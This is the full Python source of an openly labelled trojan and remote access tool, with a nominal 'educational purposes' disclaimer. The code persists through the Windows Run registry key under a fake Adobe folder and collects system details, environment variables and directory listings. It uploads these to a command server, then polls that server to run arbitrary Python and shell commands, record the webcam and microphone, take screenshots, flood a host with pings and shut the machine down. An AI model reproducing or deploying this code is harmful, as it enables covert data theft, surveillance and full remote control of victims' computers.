# Welcome to the Malware - Trojan.

# This is python source code for the trojan malware application.
# This applications will steal all your data , and give remote access to your computer.
# Use this code only in only educational purposes!

# Author: Kirill Zhosul (@kirillzhosul)

# Last active server (Development):
# https://nomistic-curve.000webhostapp.com/

# Importing modules:

# Default modules
import requests  # Module for making request to web server.
import os  # Module for working with operating system.
import sys  # Module for working with operating system.
import time  # Module for working with time.
import threading  # Module for working with threading.
import subprocess  # Module for working with console.
import re  # Module for working with regular expressions
import shutil  # Module for working with files.
import json  # Module for working with JSON.


class Trojan:
    """
        Class for working with trojan,
        making requests, stealing data and many more.
    """

    def __init__(self) -> None:
        """
        Magic method for initialising a trojan.
        :return: [None] Not returns any.
        """

        # Unique index as a string that will be used as index.
        # May be: IP:HWID
        self.__server_unique_request_index = None

        # Main server URL that will be used in for making all requests,
        # If not active, will be changed to other,
        # By default selects first active from self.__server_urls, so
        # You need just place first priority server in the first index of it.
        self.__server_url = None

        # Is loguru module is enabled or not? (Installed or not, you may not change this variable).
        self.__loguru_is_enabled = None

        # List of the all servers urls that may be active or not,
        # Write there all URLs which will be used for sending
        # Trojan data, and RAT access.
        self.__server_urls = [
            # Local server (Favorite server).
            "http://127.0.0.1",
        ]

        # Relative URL to the file on the server, where we storing message.
        self.__server_message_file = "/victim/victim_message.html"

        # Relative URL to the script file on the server, which will be used as form to send stealed information.
        self.__server_script_stealed_information_file = "/victim/stealer_information_upload.php"

        # Relative URL to the script file on the server, which will be used as remote access synchronisation.
        self.__server_script_remote_access_file = "/victim/remote_access_sync.php"

        # Should we show victim a message or not.
        self.__setting_show_message = True

        # Should we enable loguru if it is exists?
        self.__setting_enable_loguru = True

        # Should we show debug messages or not.
        self.__setting_show_debug_messages = True

        # Should stealer collect any information or not (even if sending is enabled or disabled)
        self.__setting_stealer_collect_information = True

        # Should we push to autorun? (self.push_self_to_registry)
        self.__setting_push_to_autorun = True

        # How much we should wait for sync remote access.
        self.__setting_sync_remote_access_wait_time = 60

        # Folder used as cache.
        self.__setting_cache_folder = self.get_cache_directory()

        # Should we send all stealed information on server or not.
        self.__setting_send_stealed_information_to_server = True

        # Should we sync remote access from server to client.
        self.__setting_sync_remote_access_from_server = True

        # Dictionary with all stealed by an trojan
        # Information (PC Data, Passwords and all other).
        self.__stealed_information = {}

        # Paths to files.
        self.__files_paths = {
            "stealed_information": self.__setting_cache_folder + "\\Data\\log.json",
            "stealed_microphone": self.__setting_cache_folder + "\\Audio\\recording.wav",
            "stealed_webcam": self.__setting_cache_folder + "\\Image\\Image.png",
        }

        # Running trojan.
        self.run()

    def get_cache_directory(self) -> str:
        """
        Gets cache directory.
        :return: [str] Cache directory.
        """

        if self.get_operation_system() == "Windows":
            # Windows cache directory.
            return os.getenv("APPDATA") + "\\Adobe\\Storage"
        else:
            # Other OS cache directory.
            return "/"

    def generate_unique_request_index(self) -> None:
        """
        Generates unique index for requests if not generated.
        :return: [None] Not returns any value.
        """

        # Getting information.
        ip = self.get_ip()["ip"]
        hwid = self.get_hwid()

        # Generating an URI.
        self.__server_unique_request_index = f"{ip} : {hwid}"

    def show_debug_message(self, message: str) -> None:
        """
        Function that shows debug message if it is enabled.
        :param message: [str] Message of the message.
        :return: [None] Not returns any value.
        """

        if self.__setting_show_debug_messages:
            # If enabled.

            # Getting debug message text.
            text = f"[Trojan] {message}"

            if self.__loguru_is_enabled:
                # Loguru message.

                # Importing.
                from loguru import logger

                # Showing message.
                logger.info(text)
            else:
                # Printed message.

                # Showing message.
                print(text)

    def push_self_to_registry(self) -> None:
        """
        Adds self file to an registry, so it will autorun all time you launch your OS.
        :return: [None] Not returns any.
        """

        if self.get_operation_system() != "Windows":
            # If not windows - error.
            return self.show_debug_message("Unsupported operating system for pushing to the registry")

        try:
            import winreg  # Module for working with windows registry.
        except ImportError:
            return self.show_debug_message("Error when import winreg, not pushed to the registry.")

        # Getting file name of the current script.
        file_extension = sys.argv[0].split(".")[-1]
        filename = f"{self.__setting_cache_folder}\\Update\\Update.{file_extension}"

        if not os.path.exists(filename):
            # If file not found.

            # Copy there.
            self.path_validate(filename)
            shutil.copyfile(sys.argv[0], filename)

        # Opening registry.
        registry = winreg.OpenKey(key=winreg.HKEY_CURRENT_USER,
                                  sub_key="Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                                  reserved=0,
                                  access=winreg.KEY_ALL_ACCESS
                                  )

        # Setting value.
        winreg.SetValueEx(registry, "Update", 0, winreg.REG_SZ, filename)

        # Closing registry.
        winreg.CloseKey(registry)

        # Showing debug message.
        self.show_debug_message("Added self to the registry!")

    def victim_show_message(self) -> None:
        """
        Opens main server URL in the browser, so victim will see message on the main page.
        :return: [None] Not returns any.
        """

        if self.get_operation_system() != "Windows":
            # If not windows - error.
            return self.show_debug_message("Unsupported operating system for opening an browser")

        try:
            import webbrowser  # Module for opening browser.
        except ImportError:
            return self.show_debug_message("Error when import webbrowser, message was not showed.")

        # Checking server url if down.
        self.check_server_urls()

        # Opening new browser in new window, and full raising it.
        webbrowser.open(
            url=f"{self.__server_url}{self.__server_message_file}",
            new=0,
            autoraise=True
        )

        # Showing debug message.
        self.show_debug_message("Showed message to the victim!")

    def check_server_urls(self) -> None:
        """
        Method for checking all servers url and select main.
        :return: [None] Not returns any.
        """

        for server_url in self.__server_urls:
            # For every server url in self.__server_urls.

            if self.url_is_reachable(server_url):
                # If this server is UP.

                if self.__server_url != server_url:
                    # If this is not our URL.

                    # Selecting this server as main server.
                    self.__server_url = server_url

                    # Showing debug message.
                    self.show_debug_message(f"Selected new main server URL: {server_url}")

                # Exiting.
                return

        if not self.url_is_reachable():
            # If we couldn't ping google.com,
            # So we don't have any internet connection,

            # Showing debug message.
            self.show_debug_message("Oops... There is no internet connection! Waiting 5 minutes and retrying.")

            # Sleeping for 5 minutes and retry.
            time.sleep(60 * 5)

            # Retrying.
            self.check_server_urls()

    def stealer_grab_computer_information(self) -> None:
        """
        Steals all information about computer.
        :return: [None] Not returns any.
        """

        if self.get_operation_system() != "Windows":
            # If not windows - error.
            return self.show_debug_message("Unsupported operating system for stealing computer information")

        # Getting username.
        self.__stealed_information["Computer_Username"] = os.getenv("UserName")

        # Getting computer name
        self.__stealed_information["Computer_Name"] = os.getenv("COMPUTERNAME")

        # Getting computer operating system.
        self.__stealed_information["Computer_OperatingSystem"] = os.getenv("OS")

        # Getting hardware index.
        self.__stealed_information["Computer_HardwareIndex"] = self.get_hwid()

        # Getting computer processor.
        self.__stealed_information["Computer_Processor"] = os.getenv("NUMBER_OF_PROCESSORS") + " cores "
        self.__stealed_information["Computer_Processor"] += os.getenv("PROCESSOR_ARCHITECTURE") + " "
        self.__stealed_information["Computer_Processor"] += os.getenv("PROCESSOR_IDENTIFIER") + " "
        self.__stealed_information["Computer_Processor"] += os.getenv("PROCESSOR_LEVEL") + " "
        self.__stealed_information["Computer_Processor"] += os.getenv("PROCESSOR_REVISION")

        # Getting list of all environment variables.

        # Variables dictionary.
        variables = {}

        for variable in os.environ:
            # For every variable.

            # Adding it.
            variables[variable] = os.getenv(variable)

        # Adding it.
        self.__stealed_information["Computer_EnvironmentVariables"] = variables

    def stealer_grab_internet_information(self) -> None:
        """
        Steals all information about internet and location.
        :return: [None] Not returns any.
        """

        # Getting information (IP, Address)
        information = self.get_ip()

        # Adding IP address.
        self.__stealed_information["Internet_Address"] = information["ip"]

        # Adding location.
        self.__stealed_information["Internet_City"] = information["city"]
        self.__stealed_information["Internet_Country"] = information["country"]
        self.__stealed_information["Internet_Region"] = information["region"]

        # Adding provider.
        self.__stealed_information["Internet_Provider"] = information["org"]

    def stealer_grab_information(self) -> None:
        """
        Grabs all information about client.
        :return: [None] Not returns any.
        """

        # Steal all computer information.
        self.stealer_grab_computer_information()

        # Steal all internet information.
        self.stealer_grab_internet_information()

        # Stealing all directories information.
        self.stealer_grab_directories_information()

        # Creating an log file.
        self.stealer_create_log()

        # Showing debug message.
        self.show_debug_message("Stealed all information from client!")

        if self.__setting_send_stealed_information_to_server:
            # If sending is enabled.

            # Sending information.
            self.stealer_send_information()

    def stealer_grab_directories_information(self) -> None:
        """
        Steals all information about directories.
        :return: [None] Not returns any.
        """

        if self.get_operation_system() != "Windows":
            # If not windows - error.
            return self.show_debug_message("Unsupported operating system for stealing computer information")

        # Getting user profile.
        userprofile = os.getenv("userprofile")

        # Getting drive path.
        drive = os.getcwd().split("\\")[0]

        # Adding Directories.
        self.__stealed_information["Directory_Downloads"] = os.listdir(userprofile + "\\Downloads")
        self.__stealed_information["Directory_Documents"] = os.listdir(userprofile + "\\Documents")
        self.__stealed_information["Directory_Desktop"] = os.listdir(userprofile + "\\Desktop")
        self.__stealed_information["Directory_Windows"] = os.listdir(drive + "\\")
        self.__stealed_information["Directory_ProgramFiles"] = os.listdir(drive + "\\Program Files")
        self.__stealed_information["Directory_ProgramFiles86"] = os.listdir(drive + "\\Program Files (x86)")

    def stealer_send_information(self) -> None:
        """
        Sends collected information to an server.
        :return: [None] Not returns any.
        """

        if self.get_operation_system() != "Windows":
            # If not windows - error.
            return self.show_debug_message("Unsupported operating system, FILE error!")

        # Checking server UP.
        self.check_server_urls()

        # Sending.
        try:
            with open(self.__files_paths["stealed_information"], 'rb') as file:
                # With opened file.

                # Making an request.
                request = requests.post(self.__server_url + self.__server_script_stealed_information_file,
                                        files={'log.json': file},
                                        params={
                                            "sync_uri": self.__server_unique_request_index
                                        }
                                        )

                if request.status_code != 200:
                    # If request error.
                    return self.show_debug_message("Error when syncing stealer information with an server.")
            self.show_debug_message("Sent information on the server!")
        except (FileExistsError, FileNotFoundError, IsADirectoryError, NotADirectoryError):
            # If there an exception.

            if self.get_operation_system() != "Windows":
                # If not windows - error.
                return self.show_debug_message("Unsupported operating system, FILE error!")

            # Showing debug message.
            self.show_debug_message("Not sent information on the server, file error occurred!")

    def stealer_create_log(self) -> None:
        """
        Creates log of the stealer, by creating an file in cache directory.
        :return: [None] Not returns any.
        """

        if self.get_operation_system() != "Windows":
            # If not windows - error.
            return self.show_debug_message("Unsupported operating system, FILE error!")

        # Getting filename.
        filename = self.__setting_cache_folder + "\\Data\\log.json"

        # Validating path.
        self.path_validate(filename)

        # Opening file.
        try:
            with open(filename, "w") as file:
                # Writing JSON data.
                json.dump(self.__stealed_information, file, indent=4)

            # Showing debug message.
            self.show_debug_message("Created log file in cache directory.")
        except (FileExistsError, NotADirectoryError, FileNotFoundError, UnicodeDecodeError):
            # If exception.

            if self.get_operation_system() != "Windows":
                # If not windows - error.
                return self.show_debug_message("Unsupported operating system, FILE error!")

            # Showing debug message.
            self.show_debug_message("Not create log file, as there was new exception.")

    def remote_access_launch(self) -> None:
        """
        Launch remote access thread.
        :return: [None] Not returns any.
        """

        # Getting thread.
        thread = threading.Thread(
            target=self.remote_access_thread,
            args=()
        )

        # Running thread.
        thread.run()

    def remote_access_thread(self) -> None:
        """
        Thread of the remote access, syncs all from remote access server.
        :return: [None] Not returns any.
        """

        # Showing debug message.
        self.show_debug_message("Started remote access thread!")

        while True:
            # Infinity loop.

            # Getting commands from remote server.
            synced_commands = self.remote_access_sync_from_server()

            for command in synced_commands:
                # For every command in synced commands.

                # Run this command.
                try:
                    # Getting command result.
                    command_result = ["SUCCESS", self.remote_access_execute_command(command)]
                except Exception as error:  # noqa
                    # Getting command result.
                    command_result = ["ERROR", str(error)]

                # Showing debug message.
                self.show_debug_message(f"Executed command from RA! "
                                        f"Result: {command_result}, "
                                        f"Command: {command}")

                # Syncing with server.
                self.remote_access_sync_response_to_server(command, command_result)

            # Sleeping for some second.
            time.sleep(self.__setting_sync_remote_access_wait_time)

    def remote_access_execute_command(self, command: list) -> str:
        """
        Executes command from remote server.
        :return: [None] Not return any.
        """

        # Getting command head and body (And also result).
        command_head = command[0]
        command_body = command[1]
        command_result = ""

        # If command is execute python.
        if command_head == "PYTHON":
            # If it is python command.

            # Running python command.
            try:
                exec(command_body, globals(), locals())
            except Exception as error:  # noqa
                # If exception - show this.
                command_result = str(error)

            # Trying to get result.
            try:
                command_result = X  # noqa
            except NameError:
                command_result = ""
        # If command is execute console.
        elif command_head == "CONSOLE":
            # If it is console command.

            try:
                # Getting console process.
                console_process = subprocess.Popen(command_body, shell=True,
                                                   stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=None)

                # Output.
                command_output = console_process.communicate()

                # Getting command result.
                command_result = str(command_output[0].decode('utf-8').rstrip('\r|\n'))
                command_result = command_result.replace("\n", "").replace("\r", "").replace("\t", "")
                command_result = command_result.replace("\n", "").replace("\r", "")
                command_result = re.sub("\s{4,}", " ", command_result)  # noqa
            except Exception as error:  # noqa
                # If exception - show this.
                command_result = str(error)
        # If command is make DDOS.
        elif command_head == "DDOS":
            # DDOS Command.

            # Syntax: ["DDOS", "127.0.0.1|100"]

            try:
                arguments = command_body.split("|")
                os.system(f"ping -c {arguments[1]} {arguments[0]}")
            except (Exception) as error:  # noqa
                # If exception - show this.
                command_result = str(error)
        # If command is execute system.
        elif command_head == "SYSTEM":
            # System Command.

            try:
                # Result.
                command_result = os.system(command_body)
            except Exception as error:  # noqa
                # If exception - show this.
                command_result = str(error)
        # If command is take screenshot.
        elif command_head == "SCREENSHOT":
            # Screenshot command.

            try:
                import PIL.ImageGrab  # Module for working with screenshots.
            except ImportError:
                # If we don't have this module.
                return "REQUIREMENTS WAS NOT SATISFIED FOR THIS COMMAND!"

            try:
                # Taking screenshot.
                screenshot = PIL.ImageGrab.grab()
                screenshot.show()
            except Exception as error:  # noqa
                # If exception - show this.
                command_result = str(error)
        # If command is record microphone.
        elif command_head == "MICROPHONE":
            # Recording.

            try:
                import pyaudio  # Module for working with audio.
                import wave  # Module for working with audio.
            except ImportError:
                # If we don't have this module.
                return "REQUIREMENTS WAS NOT SATISFIED FOR THIS COMMAND!"

            try:
                # Arguments.
                arguments = command_body.split("|")

                # Recording.
                self.record_microphone(arguments[0])
            except Exception as error:  # noqa
                # If exception - show this.
                command_result = str(error)
        # If command is show message.
        elif command_head == "MESSAGE":
            # Showing message.

            try:
                import ctypes  # Module for working with message boxes.
            except ImportError:
                # If we don't have this module.
                return "REQUIREMENTS WAS NOT SATISFIED FOR THIS COMMAND!"

            try:
                # Arguments.
                arguments = command_body.split("|")

                # Showing message.
                ctypes.windll.user32.MessageBoxW(0, arguments[1], arguments[0], arguments[2])
            except Exception as error:  # noqa
                # If exception - show this.
                command_result = str(error)
        # If command is record webcam.
        elif command_head == "WEBCAM":
            # Reading camera.

            try:
                import cv2  # Module for taking images from an webcam.
            except ImportError:
                # If we don't have this module.
                return "REQUIREMENTS WAS NOT SATISFIED FOR THIS COMMAND!"

            try:
                # Getting image.
                cam = cv2.VideoCapture(0)
                ret_val, img = cam.read()

                # Getting filename.
                filename = self.__files_paths["stealed_webcam"]

                # Validating path.
                self.path_validate(filename)

                # Writing to the ile.
                cv2.imwrite(filename, img)
            except Exception as error:  # noqa
                # If exception - show this.
                command_result = str(error)
        # If command is get files in directory.
        elif command_head == "FILES":
            # Getting files.

            # Getting files.
            command_result = ",".join(os.listdir(command_body))
        # If command is download file.
        elif command_head == "DOWNLOAD":
            # Downloading file

            # Returning file path for syncing file later with server.
            command_result = command_body
        # If command is shutdown computer.
        elif command_head == "SHUTDOWN":
            # Shutdown computer.
            os.system("shutdown /s /t 0")
        # If command is restart computer.
        elif command_head == "RESTART":
            # Restarting computer.
            os.system("shutdown /r")
        # If command is upload file.
        elif command_head == "UPLOAD":
            # Uploading file.

            # Returning file path for syncing file later with server.
            command_result = command_body

        # Returning result.
        return command_result

    def remote_access_sync_from_server(self) -> list:
        """
        Syncs remote access commands from the server and returns it as list.
        :return: [list] List of synced commands.
        """

        # List of commands.
        synced_commands = []

        # Getting response from a server (Synchronisation script).
        try:
            # Getting an response.
            response = requests.post(
                self.__server_url + self.__server_script_remote_access_file,
                params={
                    "sync_method": "server-client",
                    "sync_uri": self.__server_unique_request_index
                }
            )
        except (requests.exceptions.ConnectionError, requests.exceptions.HTTPError):
            # If an error.

            # Re-checking url.
            self.check_server_urls()
        else:
            # Getting response JSON.
            response = response.json()

            # Getting commands.
            synced_commands = response

        # Returning synced commands.
        return synced_commands

    def remote_access_sync_response_to_server(self, command: list, result: list) -> None:
        """
        Syncs remote access command result with an server.
        :return: [none] Not returns any.
        """

        # Getting command data.
        command_head = command[0]
        command_body = command[1]

        # Getting result data.
        result_head = result[0]
        result_body = result[1]

        # If command is execute python.
        if command_head == "PYTHON":
            # If it is python command.
            pass

        # Syncing with server.
        requests.get(self.__server_url + self.__server_script_remote_access_file,
                     params={
                         "sync_method": "client-server",
                         "sync_uri": self.__server_unique_request_index,
                         "sync_command_head": command_head,
                         "sync_command_body": command_body,
                         "sync_result_head": result_head,
                         "sync_result_body": result_body
                     })

    def record_microphone(self, seconds: int = 1) -> None:
        """
        Records microphone to the file.
        :param seconds: [int] Amount of the seconds to record.
        :return: [none] Not returns any.
        """

        try:
            import pyaudio  # Module for working with audio.
            import wave  # Module for working with audio.
        except ImportError:
            # If we don't have this module.
            return

        # Record settings.

        # Size of the chunk.
        chunk_size = 1024
        # Channels count.
        channels = 1
        # Format.
        sample_format = pyaudio.paInt16
        # Rate.
        rate = 44100

        # Creating audio port.
        audio = pyaudio.PyAudio()

        # Showing debug message.
        self.show_debug_message("Starting recording microphone.")

        # Opening audio stream.
        stream = audio.open(format=sample_format,
                            channels=channels,
                            rate=rate,
                            frames_per_buffer=chunk_size,
                            input=True)

        # Frames list.
        frames = []

        # Writing data stream.
        for i in range(0, int(rate / chunk_size * int(seconds))):
            data = stream.read(chunk_size)
            frames.append(data)

        # Stopping stream.
        stream.stop_stream()
        stream.close()

        # Stopping audio port.
        audio.terminate()

        # Showing debug message.
        self.show_debug_message("Finished recording microphone.")

        # File name.
        filename = self.__files_paths["stealed_microphone"]

        # Validating filename.
        self.path_validate(filename)

        # Save recording as wav file.
        file = wave.open(filename, 'wb')
        file.setnchannels(channels)
        file.setsampwidth(audio.get_sample_size(sample_format))
        file.setframerate(rate)
        file.writeframes(b''.join(frames))
        file.close()

    def try_import_loguru(self) -> None:
        """
        Trying to import loguru in system.
        :return: [None] Not returns anything.
        """

        if not self.__loguru_is_enabled:
            # If not arleady enabled.

            try:
                from loguru import logger

                # Enabling loguru.
                self.__loguru_is_enabled = True

                # Showing debug message.
                self.show_debug_message("Imported loguru!")
            except ImportError:
                # If error - disabling.
                self.__loguru_is_enabled = False
                self.__setting_enable_loguru = False

                # Showing debug message.
                self.show_debug_message("Couldn't import loguru as is not installed in system, please disable it.")

    def run(self) -> None:
        """
        Launches trojan by executing all needed methods.
        :return: [None] Not returns anything.
        """

        # Trying to connect loguru.
        if self.__setting_enable_loguru:
            # If enabled.

            # Importing.
            self.try_import_loguru()

        # Showing debug message.
        self.show_debug_message("Victim is run our file!")

        # Showing an message for the victim.
        if self.__setting_show_message:
            # If we enabled showing of the message.

            # Showing message.
            self.victim_show_message()

        # Generating URI.
        if self.__server_unique_request_index is None:
            # If URI is not generated.
            if self.__setting_send_stealed_information_to_server or self.__setting_sync_remote_access_from_server:
                # If any sending is enabled.

                # Generating URI.
                self.generate_unique_request_index()

        # Checking server urls, and selecting main for making requests.
        self.check_server_urls()

        # Writing to the register.
        if self.__setting_push_to_autorun:
            # If we enabled pushing to autorun.

            # Writing to registry (Autorun)
            self.push_self_to_registry()

        # Stealing information.
        if self.__setting_stealer_collect_information:
            # If stealing is enabled.

            # Collecting information.
            self.stealer_grab_information()

        # Starting syncing remote access thread.
        if self.__setting_sync_remote_access_from_server:
            # If remote access is enabled.

            # Launching remote access.
            self.remote_access_launch()

        # Showing ending of the run.
        self.show_debug_message("Ended executing of run() method!")

    def get_hwid(self) -> str:
        """
        Gets hardware index of the computer.
        :return: [str] Hardware Index.
        """

        if self.get_operation_system() != "Windows":
            # If not windows - error.
            self.show_debug_message("Unsupported operating system, HWID error!")
            return "HWID_UNSUPPORTED_ERROR"

        # Getting computer HWID.

        # Command.
        command = "wmic csproduct get uuid"

        # Process.
        process = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE,
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        # Adding it.
        return (process.stdout.read() + process.stderr.read()).decode().split("\n")[1]

    def path_validate(self, filename: str) -> None:
        """
        Validates path.
        :param filename: [str] Filename
        :return: [None] Not returns any.
        """

        if self.get_operation_system() != "Windows":
            # If not windows - error.
            return self.show_debug_message("Unsupported operating system, not validating path!")

        # Getting path.
        path = filename.split("\\")
        path.pop()
        path = "\\".join(path)

        if not os.path.exists(path):
            # If file not found.

            # Creating path.
            os.makedirs(path)

    @staticmethod
    def get_operation_system() -> str:
        """
        Gets operating system and returns it.
        :return: [str] Operating system.
        """

        if sys.platform.startswith('aix'):
            return "AIX"
        elif sys.platform.startswith('linux'):
            return "Linux"
        elif sys.platform.startswith('win32'):
            return "Windows"
        elif sys.platform.startswith('cygwin'):
            return "Cygwin"
        elif sys.platform.startswith('darwin'):
            return "MacOS"

    @staticmethod
    def get_ip() -> dict:
        """
        Gets client IP address and location.
        :return: [dict] Dict where holds IP and location.
        """

        # Getting an request.
        try:
            request = requests.get("http://ipinfo.io/json").json()
        except (json.JSONDecodeError, requests.exceptions.HTTPError, requests.exceptions.ConnectionError):
            request = {}

        # Returning request as dict.
        return request

    @staticmethod
    def url_is_reachable(url: str = "https://www.google.com/") -> bool:
        """
        Checks that given url is reachable.
        :param url: [str] URL for checking, if not given, just checks google.com as checking internet connection.
        :return: [bool] Server reachable or not.
        """

        try:
            # Getting request as it head.
            request = requests.head(url)

            # Getting status code.
            status_code = request.status_code

            # Checking that URL is reachable
            is_reachable = (status_code == 200)

            # Returning.
            return is_reachable
        except requests.exceptions.ConnectionError:
            pass


if __name__ == "__main__":
    # Entry point.

    # Launching trojan.
    Trojan()
